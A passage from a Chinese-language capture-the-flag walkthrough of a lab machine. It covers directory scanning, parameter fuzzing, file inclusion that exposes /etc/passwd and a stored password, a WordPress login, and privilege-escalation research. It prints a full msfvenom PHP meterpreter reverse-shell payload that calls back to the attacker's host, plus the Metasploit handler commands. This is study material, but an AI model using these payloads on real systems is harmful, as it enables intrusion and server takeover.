class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                   </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                      </span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                      </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                 </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                                  </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-content/uploads/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jul 30 22:25:56 2022</span><br><span class="line">DOWNLOADED: 46120 - FOUND: 15</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 挑选出能访问到页面的</span></span><br><span class="line">http://192.168.110.139/dev                                                                               </span><br><span class="line">http://192.168.110.139/index.php</span><br><span class="line">http://192.168.110.139/wordpress</span><br><span class="line">http://192.168.110.139/wordpress/wp-admin/admin.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731103121100.png" alt="image-20220731103121100"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731103211493.png" alt="image-20220731103211493"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731103317254.png" alt="image-20220731103317254"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731103422292.png" alt="image-20220731103422292"></p>
<p>这几个网址目录显示的信息有限，我们采用下一步的精细扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">找到.txt .php .zip后缀的网址</span><br><span class="line">─<span class="comment"># dirb http://192.168.110.139 -X .txt,.php,.zip</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jul 30 22:42:37 2022</span><br><span class="line">URL_BASE: http://192.168.110.139/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.txt,.php,.zip) | (.txt)(.php)(.zip) [NUM = 3]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.110.139/ ----</span><br><span class="line">+ http://192.168.110.139/image.php (CODE:200|SIZE:147)                                                                            </span><br><span class="line">+ http://192.168.110.139/index.php (CODE:200|SIZE:136)                                                                            </span><br><span class="line">+ http://192.168.110.139/secret.txt (CODE:200|SIZE:412)                                                                           </span><br><span class="line">                                                                                                                                  </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jul 30 22:42:51 2022</span><br><span class="line">DOWNLOADED: 13836 - FOUND: 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.110.139/secret.txt</span><br><span class="line">http://192.168.110.139/image.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731104652311.png" alt="image-20220731104652311"></p>
<p>wfuzz 模糊测试：</p>
<p>1.目录扫描</p>
<p>2.找参数    192.168.110.139&#x2F;?&#x3D;value    它能替换<code>？</code>找到对应参数</p>
<p>3.密码爆破   username password</p>
<p>4.找sql xss</p>
<p>5.压力测试</p>
<p>这个网址是留给我们的提示，我们可以使用wfuzz来找到网页的参数</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731104708267.png" alt="image-20220731104708267"></p>
<p><a href="http://192.168.110.139/index.php?FUZZ">http://192.168.110.139/index.php?FUZZ</a> 爆破出来的参数要替换FUZZ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">爆破出参数太多了需要进行过滤</span><br><span class="line"><span class="comment"># wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.110.139/index.php?FUZZ</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://192.168.110.139/index.php?FUZZ</span></span><br><span class="line"><span class="string">Total requests: 951</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                           </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000003:   200        7 L      12 W       136 Ch      &quot;01&quot;                                                              </span></span><br><span class="line"><span class="string">000000027:   200        7 L      12 W       136 Ch      &quot;access&quot;                                                          </span></span><br><span class="line"><span class="string">000000026:   200        7 L      12 W       136 Ch      &quot;academic&quot;                                                        </span></span><br><span class="line"><span class="string">000000028:   200        7 L      12 W       136 Ch      &quot;accessgranted&quot;                                                   </span></span><br><span class="line"><span class="string">000000015:   200        7 L      12 W       136 Ch      &quot;2001&quot;                                                            </span></span><br><span class="line"><span class="string">000000001:   200        7 L      12 W       136 Ch      &quot;@&quot;                                                               </span></span><br><span class="line"><span class="string">000000025:   200        7 L      12 W       136 Ch      &quot;about&quot;       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">─# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.110.139/index.php?FUZZ --hw 12</span></span><br><span class="line"><span class="string"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;</span>s documentation <span class="keyword">for</span> more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.110.139/index.php?FUZZ</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                           </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000341:   200        7 L      19 W       206 Ch      <span class="string">&quot;file&quot;</span>                                                            </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 950</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.110.139/index.php?file=">http://192.168.110.139/index.php?file=</a></p>
<p>这有可能是个文件包含漏洞</p>
<p><a href="http://192.168.110.139/secret.txt">http://192.168.110.139/secret.txt</a> 里面给的提示&#x2F;&#x2F;see the location.txt and you will get your next move&#x2F;&#x2F;</p>
<p>那我们可以写成<a href="http://192.168.110.139/index.php?file=location.txt">http://192.168.110.139/index.php?file=location.txt</a></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731112000870.png" alt="image-20220731112000870"></p>
<p>用secrettier360替换file作为参数</p>
<p><a href="http://192.168.110.139/index.php?secrettier360=">http://192.168.110.139/index.php?secrettier360=</a>?</p>
<p>我们尝试看一下&#x2F;etc&#x2F;passwd</p>
<p><a href="http://192.168.110.139/index.php?secrettier360=/etc/passwd">http://192.168.110.139/index.php?secrettier360=/etc/passwd</a></p>
<p>额！！！访问不了。。。我又看了一下，哦漏了个other php，我们遇到的第二个php是image.php</p>
<p>那么修改网址为<a href="http://192.168.110.139/image.php?secrettier360=/etc/passwd">http://192.168.110.139/image.php?secrettier360=/etc/passwd</a></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731112512692.png" alt="image-20220731112512692"></p>
<p>nice!!!仔细观察发现一句很特殊的话<code>find password.txt file in my directory:/home/saket</code></p>
<p>那么，我们重新修改url</p>
<p><a href="http://192.168.110.139/image.php?secrettier360=/home/saket/password.txt">http://192.168.110.139/image.php?secrettier360=/home/saket/password.txt</a></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731112713007.png" alt="image-20220731112713007"></p>
<p>那么我们在前面，找到了wordpress的登录界面和用户</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801202127526.png" alt="image-20220801202127526"></p>
<p>加上这个密码<code>follow_the_ippsec</code></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801202152244.png" alt="image-20220801202152244"></p>
<p>nice。。。进去了之后我们找个地方写反弹shell，经过一系列乱七八糟的翻找。。。我发现这里可以写入php…那么写入一句话木马好呢，还是写入反弹shell呢！！！这里我用反弹shell。。。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801202629422.png" alt="image-20220801202629422"></p>
<p>首先我们来到kali生成一个反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># lhost是kali的ip，lport是kali的监听端口</span></span><br><span class="line"><span class="comment"># msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.110.135 lport=7777 -o shell.php</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: php from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 1116 bytes</span><br><span class="line">Saved as: shell.php</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat shell.php              </span></span><br><span class="line">/*&lt;?php /**/ error_reporting(0); <span class="variable">$ip</span> = <span class="string">&#x27;192.168.110.135&#x27;</span>; <span class="variable">$port</span> = 7777; <span class="keyword">if</span> ((<span class="variable">$f</span> = &#x27;stream_socket_client&#x27;) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="string">&quot;tcp://&#123;<span class="variable">$ip</span>&#125;:&#123;<span class="variable">$port</span>&#125;&quot;</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;fsockopen&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;socket_create&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span class="variable">$res</span> = @socket_connect(<span class="variable">$s</span>, <span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; die(); &#125; <span class="variable">$s_type</span> = <span class="string">&#x27;socket&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s_type</span>) &#123; die(<span class="string">&#x27;no socket funcs&#x27;</span>); &#125; <span class="keyword">if</span> (!<span class="variable">$s</span>) &#123; die(<span class="string">&#x27;no socket&#x27;</span>); &#125; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$len</span> = fread(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$len</span> = socket_read(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$len</span>) &#123; die(); &#125; <span class="variable">$a</span> = unpack(<span class="string">&quot;Nlen&quot;</span>, <span class="variable">$len</span>); <span class="variable">$len</span> = <span class="variable">$a</span>[<span class="string">&#x27;len&#x27;</span>]; <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>; <span class="keyword">while</span> (strlen(<span class="variable">$b</span>) &lt; <span class="variable">$len</span>) &#123; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$b</span> .= fread(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$b</span> .= socket_read(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; &#125; &#125; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock&#x27;</span>] = <span class="variable">$s</span>; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock_type&#x27;</span>] = <span class="variable">$s_type</span>; <span class="keyword">if</span> (extension_loaded(<span class="string">&#x27;suhosin&#x27;</span>) &amp;&amp; ini_get(<span class="string">&#x27;suhosin.executor.disable_eval&#x27;</span>)) &#123; <span class="variable">$suhosin_bypass</span>=create_function(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); <span class="variable">$suhosin_bypass</span>(); &#125; <span class="keyword">else</span> &#123; <span class="built_in">eval</span>(<span class="variable">$b</span>); &#125; die();     </span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：复制这个反弹shell里面的内容记得不要复制前面的/*</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801204828269.png" alt="image-20220801204828269"></p>
<p>然后左下角保存</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我们建立kali的监听</span></span><br><span class="line">──<span class="params">(root㉿kali)</span>-[~]</span><br><span class="line">└─<span class="comment"># msfconsole                                                                           </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 &gt; use exploit/multi/handler </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; show options </span></span><br><span class="line"></span><br><span class="line">Module options <span class="params">(exploit/multi/handler)</span>:</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   <span class="params">----</span>  <span class="params">---------------</span>  <span class="params">--------</span>  <span class="params">-----------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options <span class="params">(php/meterpreter/reverse_tcp)</span>:</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   <span class="params">----</span>   <span class="params">---------------</span>  <span class="params">--------</span>  <span class="params">-----------</span></span><br><span class="line">   LHOST                   yes       The listen address <span class="params">(an interface may be specified)</span></span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  <span class="params">----</span></span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set lhost 192.168.110.135</span></span><br><span class="line">lhost =&gt; 192.168.110.135</span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set lport 7777</span></span><br><span class="line">lport =&gt; 7777</span><br><span class="line"><span class="comment">#msf6 exploit(multi/handler) &gt; exploit </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们无法得知这个脚本的路径怎么办呢？很简单。。。百度那个目标文件的路径或者直接下载一个wordpress看文件不就得了</p>
<p>好了路径是<code>http://192.168.110.139/wordpress/wp-content/themes/twentynineteen/secret.php</code></p>
<p>在浏览器上输入url之后回车，kali就能监听到反弹回来的信息，并且控制www</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801204258071.png" alt="image-20220801204258071"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801205250240.png" alt="image-20220801205250240"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801205310719.png" alt="image-20220801205310719"></p>
<p>我们用输入shell来对进入靶机的命令窗口环境</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801205615446.png" alt="image-20220801205615446"></p>
<p>我们可以通过whoami知道现在的用户是web的用户，我们的权限太低了，得想办法提权，我们在前面知道这个ubuntu的系统非常老了，版本在16.04</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801205826938.png" alt="image-20220801205826938"></p>
<p>我们通过kali查一下这个系统的漏洞</p>
<p>在msfconsole里面输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; searchsploit 16.04 ubuntu</span><br><span class="line">[*] <span class="built_in">exec</span>: searchsploit 16.04 ubuntu</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                   |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Apport 2.x (Ubuntu Desktop 12.10 &lt; 16.04) - Local Code Execution                                 | linux/local/40937.txt</span><br><span class="line">Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                    | linux/local/40054.c</span><br><span class="line">Google Chrome (Fedora 25 / Ubuntu 16.04) - <span class="string">&#x27;tracker-extract&#x27;</span> / <span class="string">&#x27;gnome-video-thumbnailer&#x27;</span> + <span class="string">&#x27;tote | linux/local/40943.txt</span></span><br><span class="line"><span class="string">LightDM (Ubuntu 16.04/16.10) - &#x27;</span>Guest Account<span class="string">&#x27; Local Privilege Escalation                        | linux/local/41923.txt</span></span><br><span class="line"><span class="string">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611 | linux_x86-64/local/42275.c</span></span><br><span class="line"><span class="string">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - &#x27;</span>ldso_dynamic Stac | linux_x86/local/42276.c</span><br><span class="line">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                            | linux/dos/39773.txt</span><br><span class="line">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read        | linux/local/45175.c</span><br><span class="line">Linux Kernel 4.4 (Ubuntu 16.04) - <span class="string">&#x27;BPF&#x27;</span> Local Privilege Escalation (Metasploit)                  | linux/local/40759.rb</span><br><span class="line">Linux Kernel 4.4 (Ubuntu 16.04) - <span class="string">&#x27;snd_timer_user_ccallback()&#x27;</span> Kernel Pointer Leak               | linux/dos/46529.c</span><br><span class="line">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - <span class="string">&#x27;AF_PACKET&#x27;</span> Race Condition Privilege Escalation | linux_x86-64/local/40871.c</span><br><span class="line">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter <span class="string">&#x27;target_offset&#x27;</span> Out-of-Bounds Privilege Esc | linux_x86-64/local/40049.c</span><br><span class="line">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - <span class="string">&#x27;AF_PACKET&#x27;</span> Race Condition Privilege | windows_x86-64/local/47170.c</span><br><span class="line">Linux Kernel 4.4.x (Ubuntu 16.04) - <span class="string">&#x27;double-fdput()&#x27;</span> bpf(BPF_PROG_LOAD) Privilege Escalation     | linux/local/39772.txt</span><br><span class="line">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - <span class="string">&#x27;IP6T_SO_SET_REPLACE&#x27;</span> Local Privilege Escalation           | linux/local/40489.txt</span><br><span class="line">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                       | linux/dos/45919.c</span><br><span class="line">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                    | linux/local/45010.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                           | linux/local/44298.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - <span class="string">&#x27;netfilter target_offset&#x27;</span> Local Privilege Escalatio | linux_x86-64/local/44300.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR /  | linux/local/43418.c</span><br><span class="line">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege  | linux/local/47169.c</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"><span class="comment"># 这么多个漏洞，我们发现倒数第5个漏洞Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation有本地提权的能力，我</span></span><br><span class="line">们来到kali的炸弹库拷贝武器，然后编译一下。。。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cd /usr/share/exploitdb/exploits/linux/local </span></span><br><span class="line">                                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[/usr/…/exploitdb/exploits/linux/local]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">10018.sh   19073.txt  19925.c    21061.c     22340.txt  23882.pas   31959.txt  37710.txt   41173.c    45132.rb   50385.txt</span><br><span class="line">10038.txt  19074.txt  19933.rb   21062.txt   22344.txt  23892.c     319.c      37898.py    41196.txt  45147.rb   50465.c</span><br><span class="line">10060.sh   19077.c    19946.txt  21063.txt   22362.c    24027.txt   31.pl      37937.c     411.c      45175.c    50541.c</span><br><span class="line">1009.c     19078.c    19952.c    21124.txt   22363.c    24043.c     320.pl     37975.py    41240.sh   45184.sh   50689.txt</span><br><span class="line">1029.c     19080.txt  19953.c    21158.c     22376.txt  2404.c      3213.c     37987.py    41356.txt  45205.txt  50808.c</span><br><span class="line">10313.c    19095.txt  19954.c    21159.c     22452.sh   24123.sh    322.c      37988.py    41435.txt  45243.txt  50858.txt</span><br><span class="line">10396.pl   19106.c    19955.c    21216.sh    22456.txt  24141.txt   32446.txt  38232.txt   41458.c    45288.py   5092.c</span><br><span class="line">10487.txt  19122.txt  19969.c    21217.sh    22458.c    24182.c     325.c      38298.txt   41597.txt  45313.rb   5093.c</span><br><span class="line">104.c      19125.txt  19970.c    21218.sh    22531.pl   24278.sh    32700.rb   38353.txt   4172.c     45369.rb   5167.sh</span><br><span class="line">10613.c    19142.sh   19979.pl   21219.sh    22538.pl   24398.sh    32805.c    38357.c     41760.txt  45372.txt  5424.txt</span><br><span class="line">106.c      19146.sh   19980.pl   21226.c     22540.c    24406.txt   32820.txt  38390.c     41761.txt  45407.txt  586.c</span><br><span class="line">1154.pl    19240.c    19981.sh   21227.sh    22565.c    24421.c     32829.c    38473.py    41762.txt  45497.txt  587.c</span><br><span class="line">1170.c     19243.txt  19991.c    21229.txt   22567.c    24458.txt   32848.txt  38559.txt   41763.txt  45528.txt  591.c</span><br><span class="line">1181.c     19249.c    19992.c    21231.c     22594.c    24459.sh    32947.txt  38775.rb    41764.txt  45548.txt  600.c</span><br><span class="line">1187.c     19254.c    20000.c    21247.c     22616.pl   24570.txt   33028.txt  38817.txt   41765.txt  45553.c    601.c</span><br><span class="line">120.c      19255.txt  20001.sh   21248.txt   22617.c    24606.c     33145.c    38832.py    41766.txt  45573.txt  6032.py</span><br><span class="line">12130.py   19256.c    20004.c    21258.bat   22633.c    2466.pl     331.c      38937.txt   41770.txt  45575.rb   624.c</span><br><span class="line">1215.c     19257.c    20013.c    21259.java  22640.c    24694.c     33255.txt  39010.c     41786.rb   45631.md   6337.sh</span><br><span class="line">1229.sh    19259.c    20021.txt  21280.c     22643.pl   24749.sh    3330.pl    39112.txt   417.c      45715.txt  657.c</span><br><span class="line">1267.c     19270.c    20024.c    21281.c     22644.c    24750.c     33321.c    39134.txt   41875.py   45798.txt  669.c</span><br><span class="line">1297.py    19279.sh   20045.c    21302.c     22645.c    24757.java  33322.c    39166.c     41886.c    45804.txt  684.c</span><br><span class="line">1299.sh    19281.c    2004.c     21323.c     22683.pl   24758.java  33336.c    39207.txt   41907.c    45832.py   6851.c</span><br><span class="line">129.asm    19283.c    2005.c     21341.c     22695.pl   24929.rb    3333.pl    39214.c     41923.txt  45846.py   695.c</span><br><span class="line">12.c       19284.c    2006.c     21342.c     22703.c    2492.s      33387.txt  39217.c     41955.rb   45865.php  7177.c</span><br><span class="line">1300.sh    19285.txt  20093.c    21348.txt   22719.pl   24933.txt   33395.txt  39230.c     41973.txt  45886.txt  718.c</span><br><span class="line">1310.txt   19286.c    2011.sh    21353.c     22720.c    249.c       33508.txt  39244.txt   41994.c    45913.rb   71.c</span><br><span class="line">1316.pl    19302.c    2013.c     21356.sh    22729.c    25106.c     33523.c    39277.c     41995.c    45915.rb   72.c</span><br><span class="line">131.c      19305.c    20141.pl   21362.c     22745.c    25134.c     3356.sh    39285.py    41999.txt  46006.c    7313.sh</span><br><span class="line">1397.c     19311.c    20142.sh   21375.txt   22748.c    25202.c     33576.txt  393.c       42045.c    46044.md   7393.txt</span><br><span class="line">140.c      19312.c    20155.txt  21398.txt   22768.pl   25288.c     33604.sh   39433.py    42053.c    46186.rb   741.pl</span><br><span class="line">1412.rb    19314.c    2015.py    21420.c     22773.c    25289.c     33614.c    394.c       42076.py   46241.rb   744.c</span><br><span class="line">1415.c     19315.c    20160.txt  2144.sh     22775.txt  252.pl      33623.txt  39535.sh    42183.c    46341.rb   756.c</span><br><span class="line">141.c      19360.c    2016.sh    21458.txt   22781.txt  25406.sh    33808.c    39549.txt   42255.py   46359.md   75.sh</span><br><span class="line">1425.c     19370.c    20185.c    21496.c     22806.sh   25411.py    33824.c    39628.txt   42265.py   46361.py   7618.c</span><br><span class="line">14273.sh   19371.c    20201.c    21497.pl    22813.c    25444.c     3384.c     39673.py    42305.txt  46362.py   763.c</span><br><span class="line">142.c      19373.c    20250.c    21499.txt   22815.c    25450.c     33899.txt  39692.py    42356.txt  46369.md   7681.txt</span><br><span class="line">14339.sh   19374.c    20251.c    21500.txt   22836.pl   255.pl      33904.txt  39702.rb    42357.py   46676.php  776.c</span><br><span class="line">1445.c     19384.c    20252.c    21501.txt   22840.c    25688.txt   33963.txt  39734.py    42424.py   466.pl     778.c</span><br><span class="line">1449.c     193.sh     20285.c    21502.txt   22847.txt  25707.txt   339.c      39764.py    42611.txt  46730.rb   779.sh</span><br><span class="line">144.c      19419.c    20291.sh   21503.sh    22860.c    25709.sh    34001.c    39769.txt   42626.c    46807.txt  7855.txt</span><br><span class="line">145.c      19422.txt  20312.c    21504.sh    22861.c    25789.c     34267.sh   39771.txt   42887.c    46973.md   7856.txt</span><br><span class="line">14814.c    19428.c    20316.txt  21505.c     22862.c    257.pl      3426.php   